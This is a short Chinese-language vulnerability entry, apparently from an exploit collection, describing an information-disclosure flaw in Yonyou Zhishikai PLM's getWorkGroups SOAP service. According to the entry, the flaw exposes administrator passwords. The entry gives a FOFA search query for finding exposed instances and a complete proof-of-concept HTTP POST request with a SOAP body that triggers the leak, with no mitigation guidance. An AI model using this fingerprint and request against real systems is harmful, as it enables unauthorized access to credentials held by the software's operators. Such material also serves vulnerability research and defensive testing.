## 用友智石开PLM-getWorkGroups存在信息泄露漏洞
用友智石开PLM getWorkGroups存在信息泄露漏洞，攻击者可通过该漏洞获取管理员密码等敏感信息。

## fofa

```
body="智石开PLM"
```

## poc
```
POST /services/MessageService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 208

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mes="MessageService">
   <soapenv:Header/>
   <soapenv:Body>
      <mes:getWorkGroups/>
   </soapenv:Body>
</soapenv:Envelope>
```
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405300006838.png)